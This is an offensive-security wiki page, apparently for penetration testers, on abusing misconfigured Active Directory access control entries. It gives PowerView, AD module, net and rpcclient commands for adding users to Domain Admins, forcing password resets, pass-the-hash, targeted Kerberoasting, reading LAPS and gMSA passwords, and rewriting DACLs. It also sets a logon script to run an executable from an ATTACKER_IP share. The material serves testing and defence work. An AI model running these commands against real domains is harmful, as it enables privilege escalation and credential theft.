# Access Control Entries \(ACEs\)

## Theory

Access privileges for resources in Active Directory Domain Services are usually granted through the use of an Access Control Entry \(ACE\). Access Control Entries describe the allowed and denied permissions for a principal in Active Directory against a securable object \(user, group, computer, container, organization unit \(OU\), GPO and so on\)

DACLs \(Active Directory Discretionary Access Control Lists\) are lists made of ACEs \(Access Control Entries\).

When misconsfigured, ACEs can be abused to operate lateral movement or privilege escalation within an AD domain.

## Practice

{% hint style="info" %}
The attacker needs to be in control of the object the ACE is set on to abuse it and possibly gain control over what this ACE applies to.

The following abuses can only be carried out when running commands as the user the ACE is set on. On Windows systems, this can be achieved with the following command.

```bash
runas /netonly /user:$DOMAIN\$USER
```

All abuses below can be carried out on a Windows system. I have never tested any of those on Linux. Maybe [aclpwn](https://github.com/fox-it/aclpwn.py) can do the job.
{% endhint %}

{% hint style="success" %}
Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Credential` parameter, allowing to give the user's credential as input. Here is an example with `Add-DomainGroupMember`.

```bash
$SecPassword = ConvertTo-SecureString 'pasword_of_user_to_run_as' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('FQDN.DOMAIN\user_to_run_as', $SecPassword)
Add-DomainGroupMember -Credential $Cred -Identity 'Domain Admins' -Members 'user_to_add'
```

Most of [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s functions have the `-Domain` and `-Server` parameters that can be used to explicitly specify the target Domain. This can be useful when doing labs or when encountering issues with Domain requests.
{% endhint %}

### AddMember

An attacker can add a user/group/computer to the group this ACE applies to. This can be achieved with a native command line, with the Active Directory PowerShell module, or with [Add-DomainGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
# Command line ()
net group 'Domain Admins' 'user' /add /domain

# Powershell: Active Directory module
Add-ADGroupMember -Identity 'Domain Admins' -Members 'user'

# Powershell: PowerSploit module
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user'
```

### AllExtendedRights

This ACE can be abused just like [`AddMember`](abusing-aces.md#addmember) or [`ForceChangePassword`](abusing-aces.md#forcedchangepassword). In some cases, it can also be abused like [`ReadLAPSPassword`](abusing-aces.md#readlapspassword).

> If a group is delegated “All Extended Rights” to an OU \(Organizational Unit\) that contains computers managed by LAPS, this group has the ability to view confidential attributes, including the LAPS \(Local Administrator Password Solution\) attribute `ms-mcs-admpwd` which contains the clear text password.
>
> [adsecurity.org](https://adsecurity.org/?p=3164)

### ForceChangePassword

An attacker can change the password of the user this ACE applies to. This can be achieved with [Set-DomainUserPassword](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainUserPassword/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
```

It can also be achieved from UNIX-like system with [net](https://linux.die.net/man/8/net), a tool for the administration of samba and cifs/smb clients. The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can also be used to run net commands with [pass-the-hash](abusing-ntlm/pass-the-hash.md).

```bash
# With net and cleartext credentials (will be prompted)
net rpc password $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController

# With net and cleartext credentials
net rpc password $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController

# With Pass-the-Hash
pth-net rpc password $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
```

The [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) can also be used on UNIX-like systems when the package `samba-common-bin` is missing.

```bash
rpcclient -U $DOMAIN/$ControlledUser $DomainController
rpcclient $> setuserinfo2 $TargetUser 23 $NewPassword
```

### GenericAll

This ACE can be abused just like [`AddMember`](abusing-aces.md#addmember) \(when applied to a group\), [`ForceChangePassword`](abusing-aces.md#forcedchangepassword) \(when applied to a user, **not sure about this, latest tests indicate that no, it can't be abused like this**\) or [`ReadLAPSPassword`](abusing-aces.md#readlapspassword) \(when applied to a computer\).

> It provides full rights to the object and all properties, including confidential attributes such as LAPS local Administrator passwords, and BitLocker recovery keys. In many cases, Full Control rights aren’t required, but it’s easier to delegate and get working than determining the actual rights required
>
> [adsecurity.org](https://adsecurity.org/?p=3164)

#### When applying to a user account

When applying to a user account, this ACE can be abused to add a SPN \(ServicePrincipalName\) to that account. Once the account has a SPN, it becomes vulnerable to [Kerberoasting](abusing-kerberos/kerberoast.md). This technique is called [Targeted Kerberoasting](abusing-kerberos/kerberoast.md#targeted-kerberoasting). This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) and [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
# Make sur that the target account has no SPN
Get-DomainUser victimuser | Select serviceprincipalname

# Set the SPN
Set-DomainObject -Identity victimuser -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}

# Obtain a kerberoast hash
$User = Get-DomainUser victimuser 
$User | Get-DomainSPNTicket | fl

# Clear the SPNs of the target account
$User | Select serviceprincipalname
Set-DomainObject -Identity victimuser -Clear serviceprincipalname
```

Once the Kerberoast hash is obtained, it can possibly be cracked to recover the account's password.

#### When applying to a **computer** account

When applying to a computer account, this ACE can be abused to edit the account's properties and configure it for [Kerberos Resource-Based Constrained Delegation \(RBCD\)](abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd).

#### When applying to a **GPO**

When applying to a GPO, this ACE can be abused to edit its settings and operate an [Immediate Scheduled Task attack](abusing-gpos.md#immediate-scheduled-task).

### GenericWrite

An attacker can make the user this ACE applies to execute a custom script at logon. This can be achieved with the Active Directory PowerShell module or with [Set-DomainObject](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObject/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
# With Set-ADObject (Active Directory module)
Set-ADObject -SamAccountName 'user' -PropertyName scriptpath -PropertyValue "\\ATTACKER_IP\run_at_logon.exe"

# With Set-DomainObject (PowerView module)
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\ATTACKER_IP\run_at_logon.exe'} -Verbose
```

This can be abused the same way as [`GenericAll`](abusing-aces.md#genericall) for [Targeted Kerberoasting](abusing-kerberos/kerberoast.md#targeted-kerberoasting), for [Kerberos Resource-Based Constrained Delegation \(RBCD\)](abusing-kerberos/kerberos-delegations.md#resource-based-constrained-delegations-rbcd) and for an [Immediate Scheduled Task attack](abusing-gpos.md#immediate-scheduled-task).

### ReadLAPSPassword

An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module.

```bash
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
```

### ReadGMSAPassword

An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.

```bash
# Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

# Decode the data structure using the DSInternals module
ConvertFrom-ADManagedPasswordBlob $mp
```

### WriteDacl

An attacker can write a new ACE to the target object’s DACL \(Discretionary Access Control List\). This can give the attacker full control of the target object. This can be achieved with [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

For instance, this ACE can be abused to grant `GenericAll` rights over the compromised object \(see [`GenericAll`](abusing-aces.md#genericall) for abuse notes\).

```bash
Add-DomainObjectAcl -TargetIdentity "target_object" -Rights All
```

When an object has `WriteDacl` over the Domain object, it is possible to gain domain admin privileges. Exchange Servers used to have this right, allowing attackers to conduct a PrivExchange attack \(see the [PushSubscription abuse](forced-authentications/privexchange-pushsubscription-abuse.md), and the [NTLM relay attack](abusing-ntlm/ntlm-relay.md) using Impacket's [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) and the `--escalate-user` option\)

### WriteOwner

An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with [Set-DomainObjectOwner](https://powersploit.readthedocs.io/en/latest/Recon/Set-DomainObjectOwner/) \([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module\).

```bash
Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
```

This ACE can be abused for an [Immediate Scheduled Task attack](abusing-gpos.md#immediate-scheduled-task), or for [adding a user to the local admin group](abusing-gpos.md#adding-a-user-to-the-local-admin-group).

### WriteProperty

An attacker can abuse this ACE when it applies to a GPO \(or at least the `GPC-File-Sys-Path` property of a GPO\) for an [Immediate Scheduled Task attack](abusing-gpos.md#immediate-scheduled-task).

## Resources

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces\#genericall-on-user" caption="" %}

{% embed url="https://wald0.com/?p=112" caption="" %}

{% embed url="https://adsecurity.org/?p=3658" caption="" %}

